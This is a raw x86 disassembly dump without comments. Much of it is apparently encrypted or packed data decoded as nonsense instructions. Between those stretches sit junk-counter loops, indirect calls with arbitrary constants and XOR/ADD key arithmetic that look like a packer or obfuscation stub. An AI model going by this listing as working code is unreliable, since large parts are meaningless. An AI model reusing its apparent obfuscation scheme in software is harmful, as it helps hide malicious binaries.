  40a6ae:	cmp    eax,0x6a8686b0
  40a6b3:	jl     0x40a718
  40a6b5:	stos   DWORD PTR es:[edi],eax
  40a6b6:	sbb    BYTE PTR [ecx+ebx*2-0x7fe89365],ch
  40a6bd:	sub    dh,dl
  40a6bf:	push   ecx
  40a6c0:	dec    DWORD PTR [edi-0x435dd52d]
  40a6c6:	cmp    bh,BYTE PTR [ebx]
  40a6c8:	jbe    0x40a6da
  40a6ca:	addr16 xchg esp,eax
  40a6cc:	repnz iret 
  40a6ce:	(bad)  [esi-0x1dac7ef]
  40a6d4:	jle    0x40a703
  40a6d6:	or     DWORD PTR [edx+0x55],ecx
  40a6d9:	retf   0x6b53
  40a6dc:	mov    bl,0xa1
  40a6de:	push   0x2ad6d9c6
  40a6e3:	call   0x276d:0xcdb9e59c
  40a6ea:	in     eax,dx
  40a6eb:	into   
  40a6ec:	out    0xe3,al
  40a6ee:	popf   
  40a6ef:	ja     0x40a721
  40a6f1:	add    dl,BYTE PTR [edx-0x43535b4]
  40a6f7:	(bad)  
  40a6f8:	adc    ah,BYTE PTR [edi-0x70]
  40a6fb:	(bad)  
  40a6fd:	ss out 0xbc,eax
  40a700:	mov    edx,0x2c6e3c86
  40a705:	push   ecx
  40a706:	sbb    al,0xdb
  40a708:	out    dx,al
  40a709:	jae    0x40a6ab
  40a70b:	into   
  40a70c:	push   eax
  40a70d:	mov    ecx,DWORD PTR [ebx+0x5b]
  40a710:	push   0x39
  40a712:	pop    eax
  40a713:	and    eax,0xbc9df015
  40a718:	scas   eax,DWORD PTR es:[edi]
  40a719:	rol    BYTE PTR [ecx+0x491dfca7],1
  40a71f:	adc    BYTE PTR [eax+0x2c],al
  40a722:	mov    ebx,0xa5b69d00
  40a727:	aam    0xb9
  40a729:	cmp    edi,ebp
  40a72b:	cmp    ebx,ebx
  40a72d:	retf   
  40a72e:	sti    
  40a72f:	setg   BYTE PTR [eax]
  40a732:	ret    0xf650
  40a735:	add    eax,0x310aa71d
  40a73a:	div    DWORD PTR [eax]
  40a73c:	test   DWORD PTR [edi-0x62],0xf749bedf
  40a743:	out    0x7a,al
  40a745:	pusha  
  40a746:	std    
  40a747:	or     eax,0xfb2fe38a
  40a74c:	jle    0x40a7b0
  40a74e:	xor    BYTE PTR [eax],0x1b
  40a751:	test   al,0x12
  40a753:	xchg   esp,eax
  40a754:	sbb    eax,0x2b2a0751
  40a759:	addr16 inc esi
  40a75b:	sub    eax,0xa77f2a84
  40a760:	shl    BYTE PTR [edi-0x6c],cl
  40a763:	inc    ecx
  40a764:	scas   al,BYTE PTR es:[edi]
  40a765:	or     eax,0x2be95252
  40a76a:	iret   
  40a76b:	mov    ch,0x1c
  40a76d:	xchg   esp,eax
  40a76e:	shl    BYTE PTR [ebp+0x7b3c1e24],cl
  40a774:	dec    ecx
  40a775:	mov    cl,0xff
  40a777:	test   al,0x62
  40a779:	and    BYTE PTR [edx+0x17099f0d],ah
  40a77f:	imul   eax,DWORD PTR [ebx],0x4d
  40a782:	bound  edx,QWORD PTR [edi-0x13]
  40a785:	scas   al,BYTE PTR es:[edi]
  40a786:	aam    0xfe
  40a788:	adc    DWORD PTR [ebp-0x28],ecx
  40a78b:	stos   DWORD PTR es:[edi],eax
  40a78c:	push   edi
  40a78d:	jmp    0x40a945
  40a792:	mov    ah,0x79
  40a794:	jae    0x40a807
  40a796:	jno    0x40a809
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2+0x15]
  40a79f:	(bad)  
  40a7a0:	xor    ch,BYTE PTR [edi+esi*2]
  40a7a3:	out    dx,eax
  40a7a4:	jo     0x40a816
  40a7a6:	xchg   ebp,eax
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a7ec
  40a7ab:	push   ebx
  40a7ac:	dec    ebp
  40a7ad:	int3   
  40a7ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7af:	(bad)  
  40a7b0:	sbb    al,0x2d
  40a7b2:	icebp  
  40a7b3:	(bad)  
  40a7b4:	mov    esi,0x9484665b
  40a7b9:	xor    BYTE PTR [edx-0x5b],0x83
  40a7bd:	pop    ecx
  40a7be:	iret   
  40a7bf:	pop    edx
  40a7c0:	adc    al,0x7f
  40a7c2:	mov    BYTE PTR [edx-0x1a],dl
  40a7c5:	xchg   esp,eax
  40a7c6:	add    eax,0xb8b825aa
  40a7cb:	cmp    BYTE PTR [ecx],al
  40a7cd:	mov    cl,0xb4
  40a7cf:	and    eax,0xd337c0f0
  40a7d4:	xor    al,0x48
  40a7d6:	pusha  
  40a7d7:	pop    ds
  40a7d8:	sub    ah,BYTE PTR [edi]
  40a7da:	mov    eax,0x2d204092
  40a7df:	ds xchg bh,ch
  40a7e2:	ret    
  40a7e3:	mov    bl,0x73
  40a7e5:	(bad)  [ecx]
  40a7e7:	mov    al,BYTE PTR [edx]
  40a7e9:	sub    DWORD PTR [edi-0x47],0xfffffffe
  40a7ed:	inc    ebx
  40a7ee:	into   
  40a7ef:	in     eax,dx
  40a7f0:	call   0x54c1:0x78329e37
  40a7f7:	test   BYTE PTR [ebx],dh
  40a7f9:	add    ebx,edi
  40a7fb:	sbb    BYTE PTR [eax],bh
  40a7fd:	sbb    al,0xf
  40a7ff:	lock je 0x40a821
  40a802:	mov    edx,0x84acc898
  40a807:	mov    eax,ds:0xa7ae2bc3
  40a80c:	outs   dx,DWORD PTR ds:[esi]
  40a80d:	fidivr WORD PTR [ecx]
  40a80f:	in     al,dx
  40a810:	add    eax,0x56dc0ee8
  40a815:	fild   WORD PTR [ebx+0x2697019b]
  40a81b:	inc    eax
  40a81c:	test   al,0x6f
  40a81e:	xchg   ebp,eax
  40a81f:	in     eax,0xf8
  40a821:	scas   al,BYTE PTR es:[edi]
  40a822:	mov    edx,0x3cc6d69f
  40a827:	mov    ch,0x36
  40a829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a82a:	push   edi
  40a82b:	dec    edi
  40a82c:	push   edx
  40a82d:	mov    ecx,0x25ce8e04
  40a832:	mov    eax,0x7a974b1d
  40a837:	rol    BYTE PTR [ebx],cl
  40a839:	repz cmp ebp,DWORD PTR [edx+esi*2+0x16]
  40a83e:	es stos DWORD PTR es:[edi],eax
  40a840:	pop    esi
  40a841:	retf   
  40a842:	mov    BYTE PTR [eax],cl
  40a844:	test   eax,0x2e0a0c58
  40a849:	pop    esp
  40a84a:	xchg   ebp,eax
  40a84b:	pushf  
  40a84c:	xchg   edx,eax
  40a84d:	dec    ebp
  40a84e:	aam    0xf4
  40a850:	dec    edx
  40a851:	push   0x53
  40a853:	xchg   edi,eax
  40a854:	mov    ds:0x3f39a709,eax
  40a859:	sbb    DWORD PTR [eax],esi
  40a85b:	cld    
  40a85c:	leave  
  40a85d:	sbb    esp,edi
  40a85f:	cdq    
  40a860:	mov    cl,0xd8
  40a862:	mov    dl,0xf5
  40a864:	mov    esp,0x62e6ce21
  40a869:	mov    ?,WORD PTR [edx+0x62550775]
  40a86f:	std    
  40a870:	push   esi
  40a871:	adc    al,0x53
  40a873:	adc    esi,esi
  40a875:	dec    esp
  40a876:	call   0xace6:0x226552a7
  40a87d:	arpl   di,sp
  40a87f:	inc    eax
  40a880:	aam    0x14
  40a882:	and    esp,DWORD PTR [edx+0x55]
  40a885:	dec    ebx
  40a886:	retf   0x1991
  40a889:	adc    dl,dl
  40a88b:	daa    
  40a88c:	das    
  40a88d:	ins    BYTE PTR es:[edi],dx
  40a88e:	das    
  40a88f:	mov    dl,al
  40a891:	cdq    
  40a892:	mov    bh,0x42
  40a894:	xchg   esi,eax
  40a895:	push   es
  40a896:	cmp    edx,DWORD PTR [edx-0x30c91383]
  40a89c:	jmp    0x40a8cf
  40a89e:	loop   0x40a8f2
  40a8a0:	scas   al,BYTE PTR es:[edi]
  40a8a1:	in     al,dx
  40a8a2:	js     0x40a907
  40a8a4:	xchg   ecx,eax
  40a8a5:	(bad)  
  40a8a6:	mov    al,BYTE PTR [esi-0x32092b4a]
  40a8ac:	jae    0x40a8bb
  40a8ae:	fst    QWORD PTR [esi-0x6eb60c73]
  40a8b4:	inc    esp
  40a8b5:	shr    edi,cl
  40a8b7:	outs   dx,BYTE PTR ds:[esi]
  40a8b8:	pushf  
  40a8b9:	mov    cl,BYTE PTR [esi-0x211b6c98]
  40a8bf:	(bad)
  40a8c2:	test   al,0x81
  40a8c4:	int3   
  40a8c5:	std    
  40a8c6:	or     edi,DWORD PTR [esi]
  40a8c8:	out    0x81,eax
  40a8ca:	push   0xffffffc1
  40a8cc:	adc    eax,0x15632c3e
  40a8d1:	out    0xc3,eax
  40a8d3:	push   0xffffff86
  40a8d5:	(bad)  
  40a8d6:	adc    DWORD PTR [edi+0x4b],esp
  40a8d9:	push   es
  40a8da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8db:	leave  
  40a8dc:	xchg   eax,edx
  40a8de:	push   eax
  40a8df:	pop    ss
  40a8e0:	stc    
  40a8e1:	or     bl,cl
  40a8e3:	xor    edi,DWORD PTR [ebx-0x25]
  40a8e6:	dec    esp
  40a8e7:	imul   ecx,ecx,0xd504b26e
  40a8ed:	mov    al,0x6a
  40a8ef:	or     al,0xe0
  40a8f1:	mov    cl,0x80
  40a8f3:	shl    BYTE PTR [ecx],1
  40a8f5:	in     al,dx
  40a8f6:	clc    
  40a8f7:	repnz sub eax,0xffffffbf
  40a8fb:	repz addr16 mov edx,0x3a788408
  40a902:	cmp    al,0x9e
  40a904:	and    DWORD PTR [edi],esi
  40a906:	fs adc al,0x80
  40a909:	test   al,0xe7
  40a90b:	jae    0x40a8a8
  40a90d:	sub    BYTE PTR [ebx+0x20],ch
  40a910:	enter  0xc58a,0x77
  40a914:	lds    esi,FWORD PTR [ebx+0x67]
  40a917:	inc    esi
  40a918:	jmp    0x40a943
  40a91a:	or     ebx,DWORD PTR [ecx+0x6c]
  40a91d:	jo     0x40a8a4
  40a91f:	loopne 0x40a97f
  40a921:	xchg   edi,eax
  40a922:	ror    BYTE PTR [edi],1
  40a924:	cdq    
  40a925:	cmp    bl,BYTE PTR [edx-0x37]
  40a928:	(bad)  
  40a929:	cmp    ebp,edi
  40a92b:	jecxz  0x40a8b1
  40a92d:	mov    al,0x66
  40a92f:	fwait
  40a930:	jle    0x40a987
  40a932:	mov    ds:0x8da221f2,al
  40a937:	jmp    0x40a932
  40a939:	jns    0x40a919
  40a93b:	popa   
  40a93c:	mov    WORD PTR [ebp-0x3f1853b6],fs
  40a942:	cmp    cl,bh
  40a944:	test   eax,0x32729cbf
  40a949:	add    BYTE PTR [ebx],dl
  40a94b:	sbb    eax,0x432788
  40a950:	add    eax,edi
  40a952:	sbb    DWORD PTR ds:0x432e62,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x4344a1
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432e62,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432e4a,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x43277c,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x43277c
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x43277c,ebx
  40a996:	cmp    DWORD PTR ds:0x43277c,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x43277c,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432d92
  40a9bb:	cmp    DWORD PTR ds:0x43277c,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x43277c
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x43277c,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x432778,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x432778
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x432778,ecx
  40aa04:	cmp    DWORD PTR ds:0x432778,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x432778,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432ce2
  40aa39:	cmp    DWORD PTR ds:0x432778,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x432778
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x432778,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x4343f6,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x4343fe,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x4343fe
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x4343fe,ecx
  40aa7f:	cmp    DWORD PTR ds:0x4343fe,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x4343fe,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x4327dd
  40aaa8:	call   DWORD PTR ds:0x432d96
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x4343ee,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x434422,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432e46,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434412
  40aae3:	sbb    DWORD PTR ds:0x43276c,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434499,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432e62,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434412,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0x237cbad5
  40ab36:	pop    ecx
  40ab37:	pop    ecx
  40ab38:	inc    esi
  40ab39:	mov    ebp,gs
  40ab3b:	jo     0x40abad
  40ab3d:	xchg   ebp,eax
  40ab3e:	jg     0x40abb0
  40ab40:	jo     0x40ab0f
  40ab42:	sar    DWORD PTR [eax-0x47],cl
  40ab45:	in     al,0xf4
  40ab47:	popf   
  40ab48:	dec    ebp
  40ab49:	idiv   ch
  40ab4b:	repz and bl,BYTE PTR [ebp+0x1bf2ed2]
  40ab52:	nop
  40ab53:	ret    0x34fa
  40ab56:	les    esp,FWORD PTR [edx+ebx*8]
  40ab59:	ret    0x8763
  40ab5c:	mov    ds:0x5f6ba7b,eax
  40ab61:	dec    ebx
  40ab62:	cmp    al,0x3d
  40ab64:	call   0xb220:0xe20e38f8
  40ab6b:	or     eax,0x98f77972
  40ab70:	std    
  40ab71:	out    dx,al
  40ab72:	jbe    0x40ab36
  40ab74:	cmp    eax,0xbbe91ce
  40ab79:	daa    
  40ab7a:	sub    eax,0x9910e1a3
  40ab7f:	(bad)  
  40ab80:	pop    eax
  40ab81:	dec    esi
  40ab82:	mov    cl,0xbb
  40ab84:	push   ebx
  40ab85:	add    al,0x45
  40ab87:	loopne 0x40ab81
  40ab89:	ins    DWORD PTR es:[edi],dx
  40ab8a:	sub    al,BYTE PTR [ecx-0x19]
  40ab8d:	es xchg ebx,eax
  40ab8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab90:	mov    ch,0x94
  40ab92:	push   ss
  40ab93:	cmp    DWORD PTR [ebp+0x2eb95a19],0xd21b3a15
  40ab9d:	jae    0x40ab59
  40ab9f:	jmp    esp
  40aba1:	or     DWORD PTR [ebx-0x1180c9f7],esp
  40aba7:	dec    edx
  40aba8:	mov    dl,0x21
  40abaa:	sahf   
  40abab:	pop    edx
  40abac:	push   es
  40abad:	push   ds
  40abae:	sub    dl,BYTE PTR [ebx+0x76]
  40abb1:	jg     0x40abdb
  40abb3:	mov    bl,0xf0
  40abb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abb6:	lods   al,BYTE PTR ds:[esi]
  40abb7:	sbb    edi,eax
  40abb9:	je     0x40ab61
  40abbb:	popa   
  40abbc:	sar    BYTE PTR [edx+0x58],0xf5
  40abc0:	out    dx,eax
  40abc1:	loopne 0x40abe7
  40abc3:	je     0x40ac04
  40abc5:	int    0xf8
  40abc7:	call   0x70743e80
  40abcc:	daa    
  40abcd:	push   esp
  40abce:	retf   
  40abcf:	inc    ebx
  40abd0:	xchg   edx,eax
  40abd1:	push   es
  40abd2:	sbb    al,0x6a
  40abd4:	xchg   esp,eax
  40abd5:	rcl    DWORD PTR [ebp+0xf16aef9],1
  40abdb:	mov    DWORD PTR [ecx],eax
  40abdd:	cwde   
  40abde:	sbb    ah,BYTE PTR [edx-0x63]
  40abe1:	test   eax,0x6c803ff0
  40abe6:	push   edi
  40abe7:	mov    bh,0x3f
  40abe9:	xchg   DWORD PTR [ecx+0x3500db30],edx
  40abef:	mov    ds:0x7122464a,al
  40abf4:	ret    0xecb8
  40abf7:	push   esp
  40abf8:	cwde   
  40abf9:	and    eax,0x9a26c72b
  40abfe:	imul   ecx,DWORD PTR ss:[esi],0x35
  40ac02:	cs (bad) 
  40ac04:	mov    bh,0xc2
  40ac06:	mov    ss,WORD PTR [edx+0x5a46748e]
  40ac0c:	imul   esp,DWORD PTR [ebx+edi*2-0x23652e7b],0x36
  40ac14:	call   0x4530:0xf117ffa3
  40ac1b:	or     BYTE PTR [ecx-0x78],dl
  40ac1e:	jnp    0x40abbf
  40ac20:	dec    ebp
  40ac21:	stos   BYTE PTR es:[edi],al
  40ac22:	push   ebp
  40ac23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac24:	cmc    
  40ac25:	sub    DWORD PTR [edi+0x19],esp
  40ac28:	(bad)  
  40ac29:	mov    ds:0xef23bf9c,eax
  40ac2e:	aam    0x31
  40ac30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac31:	out    0xb4,al
  40ac33:	pop    edx
  40ac34:	stos   BYTE PTR es:[edi],al
  40ac35:	dec    ebx
  40ac36:	push   ebp
  40ac37:	adc    eax,0x5cf8791e
  40ac3c:	sbb    al,0xd5
  40ac3e:	shl    esi,cl
  40ac40:	rcr    DWORD PTR [ecx],1
  40ac42:	out    dx,al
  40ac43:	jno    0x40abf4
  40ac45:	xor    BYTE PTR [ecx],ah
  40ac47:	daa    
  40ac48:	pop    ebp
  40ac49:	push   ebp
  40ac4a:	nop
  40ac4b:	xor    eax,0xe2923884
  40ac50:	xchg   edx,eax
  40ac51:	add    al,0x5e
  40ac53:	pop    eax
  40ac54:	in     al,dx
  40ac55:	mov    ds:0xf5c1932c,al
  40ac5a:	and    DWORD PTR [edx+0x31],ecx
  40ac5d:	scas   al,BYTE PTR es:[edi]
  40ac5e:	push   0xffffffdc
  40ac60:	int3   
  40ac61:	fucomip st,st(7)
  40ac63:	add    eax,0xf7ea779a
  40ac68:	push   esp
  40ac69:	inc    ebp
  40ac6a:	cmp    DWORD PTR [edx],edi
  40ac6c:	ins    BYTE PTR es:[edi],dx
  40ac6d:	icebp  
  40ac6e:	js     0x40abfe
  40ac70:	jmp    0x40abfb
  40ac72:	cmp    bl,dh
  40ac74:	fadd   QWORD PTR [esi]
  40ac76:	cmp    edi,DWORD PTR [ebx-0x31]
  40ac79:	jl     0x40ac87
  40ac7b:	or     DWORD PTR [edi+0x4a],ebp
  40ac7e:	cwde   
  40ac7f:	mov    ebx,0x47b6ed34
  40ac84:	fild   DWORD PTR [ecx+0x7e]
  40ac87:	aaa    
  40ac88:	mov    WORD PTR [esi-0x52485f42],ss
  40ac8e:	out    dx,eax
  40ac8f:	repz pushf 
  40ac91:	xchg   ebp,eax
  40ac92:	dec    edx
  40ac93:	inc    ebp
  40ac94:	jecxz  0x40acff
  40ac96:	xchg   edx,eax
  40ac97:	imul   BYTE PTR [edi+0x6057756a]
  40ac9d:	daa    
  40ac9e:	icebp  
  40ac9f:	jge    0x40ad1c
  40aca1:	cmp    BYTE PTR [ecx-0x7f],bh
  40aca4:	jecxz  0x40acda
  40aca6:	push   eax
  40aca7:	mov    esp,0xb42a56fd
  40acac:	adc    eax,0x5b3c7f2d
  40acb1:	repnz cmp bh,BYTE PTR [esi]
  40acb4:	push   0x6381cd08
  40acb9:	(bad)  
  40acba:	popf   
  40acbb:	test   DWORD PTR [edi-0x272af843],0x10ec888f
  40acc5:	pop    ebx
  40acc6:	pop    ebp
  40acc7:	out    0xc1,al
  40acc9:	xchg   edx,eax
  40acca:	or     eax,0x3c45e1fe
  40accf:	jno    0x40ac6a
  40acd1:	test   eax,0x961210a4
  40acd6:	pop    ss
  40acd7:	push   ebp
  40acd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acd9:	push   eax
  40acda:	sar    bl,cl
  40acdc:	mov    eax,DWORD PTR [ebp+0x8]
  40acdf:	mov    ecx,DWORD PTR [ebp-0x8]
  40ace2:	xor    eax,esi
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	inc    edx
  40ad45:	scas   al,BYTE PTR es:[edi]
  40ad46:	cdq    
  40ad47:	popa   
  40ad48:	and    ebx,ebp
  40ad4a:	jo     0x40adbc
  40ad4c:	xchg   ebp,eax
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40adb8
  40ad51:	dec    esp
  40ad52:	and    DWORD PTR [edi+ebx*8+0x1b],esi
  40ad56:	and    esi,esp
  40ad58:	push   es
  40ad59:	or     dl,BYTE PTR [ebp-0x6c]
  40ad5c:	mov    ds:0xf6952e34,eax
  40ad61:	ret    0x1e39
  40ad64:	adc    BYTE PTR [esi-0x4fecde91],dh
  40ad6a:	scas   eax,DWORD PTR es:[edi]
  40ad6b:	pop    ds
  40ad6c:	cli    
  40ad6d:	sti    
  40ad6e:	adc    eax,0x36a4f789
  40ad73:	stc    
  40ad74:	inc    ebx
  40ad75:	leave  
  40ad76:	or     ebp,DWORD PTR cs:[ebx+edx*8-0x59]
  40ad7b:	sub    DWORD PTR [esi],ebx
  40ad7d:	mov    WORD PTR [ecx],es
  40ad7f:	jne    0x40ad78
  40ad81:	test   eax,0x8abb2f5d
  40ad86:	add    ebx,DWORD PTR [ecx-0x15]
  40ad89:	(bad)  
  40ad8b:	pop    eax
  40ad8c:	test   ebp,edx
  40ad8e:	mov    ds:0xbc8dc4a7,eax
  40ad93:	mov    ch,0x8a
  40ad95:	and    eax,0xad9f3f7f
  40ad9a:	mov    ch,0x89
  40ad9c:	lock fsub DWORD PTR [edi-0x71]
  40ada0:	jns    0x40ade9
  40ada2:	push   ecx
  40ada3:	sar    DWORD PTR ds:[ecx+0x1d],1
  40ada7:	push   cs
  40ada8:	inc    edx
  40ada9:	and    al,BYTE PTR [edx]
  40adab:	out    0x90,eax
  40adad:	(bad)  
  40adae:	mov    ch,0x93
  40adb0:	lods   eax,DWORD PTR ds:[esi]
  40adb1:	push   es
  40adb2:	mov    ebx,0x96fdc384
  40adb7:	jne    0x40ad8a
  40adb9:	cli    
  40adba:	mov    edx,0x371656b1
  40adbf:	xlat   BYTE PTR ds:[ebx]
  40adc0:	jb     0x40adcc
  40adc2:	(bad)  
  40adc3:	scas   eax,DWORD PTR es:[edi]
  40adc4:	xchg   esp,eax
  40adc5:	push   0x74
  40adc7:	xchg   esp,eax
  40adc8:	pop    ecx
  40adc9:	or     eax,0xdd7058bc
  40adce:	fldenv [edx-0x63096913]
  40add4:	ret    
  40add5:	mov    bh,0x2a
  40add7:	xor    DWORD PTR [edi-0x9],ebp
  40adda:	add    esi,esp
  40addc:	out    0xbf,al
  40adde:	sub    eax,0x22d91776
  40ade3:	push   es
  40ade4:	cs pop ebx
  40ade6:	mov    al,es:0xf867aa1d
  40adec:	mov    ecx,0x9b7cefc6
  40adf1:	in     al,dx
  40adf2:	repnz out 0x55,eax
  40adf5:	jns    0x40ae69
  40adf7:	xor    eax,0xe3a89b3
  40adfc:	add    DWORD PTR [ebx],0x4b46cb49
  40ae02:	out    0x1c,al
  40ae04:	mov    ecx,0x316f8e9f
  40ae09:	pop    eax
  40ae0a:	jge    0x40adb9
  40ae0c:	xchg   edx,eax
  40ae0d:	jmp    0x40ae84
  40ae0f:	ror    DWORD PTR [ebp-0x4a3397bb],0x55
  40ae16:	ficomp WORD PTR [edi+ebx*8+0x17]
  40ae1a:	lods   eax,DWORD PTR ds:[esi]
  40ae1b:	pop    ebx
  40ae1c:	aaa    
  40ae1d:	cwde   
  40ae1e:	cmp    ah,BYTE PTR [esi-0x3088b0a4]
  40ae24:	push   edi
  40ae25:	neg    DWORD PTR [edi]
  40ae27:	jg     0x40ae88
  40ae29:	lods   eax,DWORD PTR ds:[esi]
  40ae2a:	fimul  WORD PTR [edi]
  40ae2c:	das    
  40ae2d:	mov    cl,BYTE PTR [esi-0x1ba202ad]
  40ae33:	or     edi,ebp
  40ae35:	mov    edi,esp
  40ae37:	xor    edi,DWORD PTR [esi+0xd]
  40ae3a:	adc    BYTE PTR [eax+0x61],ah
  40ae3d:	xchg   BYTE PTR [eax-0x35],bh
  40ae40:	cmove  ebp,DWORD PTR [edx]
  40ae43:	ret    
  40ae44:	les    ebx,FWORD PTR [edx]
  40ae46:	pusha  
  40ae47:	(bad)  
  40ae49:	inc    esi
  40ae4a:	rol    DWORD PTR [eax+0x8],1
  40ae4d:	mov    cl,0x7f
  40ae4f:	stc    
  40ae50:	xor    BYTE PTR [eax+0x40],0x50
  40ae54:	jo     0x40aeaa
  40ae56:	push   ebp
  40ae57:	(bad)  
  40ae59:	aas    
  40ae5a:	xchg   esp,eax
  40ae5b:	nop
  40ae5c:	and    ecx,DWORD PTR [edi+0x181dc2ac]
  40ae62:	jl     0x40ae50
  40ae64:	mov    eax,ds:0xfbe584fd
  40ae69:	or     ebx,DWORD PTR [eax+0x20e3fd4a]
  40ae6f:	div    BYTE PTR [ebx]
  40ae71:	test   DWORD PTR [edx],edi
  40ae73:	scas   eax,DWORD PTR es:[edi]
  40ae74:	jno    0x40aec5
  40ae76:	push   esp
  40ae77:	add    eax,0x8ffdb9a9
  40ae7c:	arpl   WORD PTR gs:[ebp-0x96353d1],sp
  40ae83:	pushf  
  40ae84:	sbb    BYTE PTR [ebp+0x14aa73d5],cl
  40ae8a:	imul   esi,DWORD PTR [eax+0x2d766d6],0x2b
  40ae91:	pop    ebp
  40ae92:	pop    esp
  40ae93:	cmp    al,0xc5
  40ae95:	xchg   edx,eax
  40ae96:	cmp    eax,0x3d033f61
  40ae9b:	mov    cs,WORD PTR [ecx+0x5b]
  40ae9e:	in     al,0x64
  40aea0:	std    
  40aea1:	sti    
  40aea2:	aam    0xab
  40aea4:	enter  0x150a,0xc1
  40aea8:	push   ebx
  40aea9:	test   eax,0xb2e6a515
  40aeae:	xlat   BYTE PTR ds:[ebx]
